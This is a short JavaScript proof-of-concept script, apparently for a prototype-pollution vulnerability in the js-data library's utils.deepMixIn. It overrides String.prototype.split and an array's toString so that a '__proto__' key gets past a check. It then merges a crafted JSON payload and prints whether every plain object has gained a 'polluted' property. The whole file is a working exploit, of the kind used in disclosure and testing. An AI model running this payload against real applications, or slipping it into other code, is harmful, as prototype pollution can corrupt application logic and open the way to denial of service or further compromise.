var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const {utils} = require('js-data');
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
utils.deepMixIn({}, source);
console.log({}.polluted);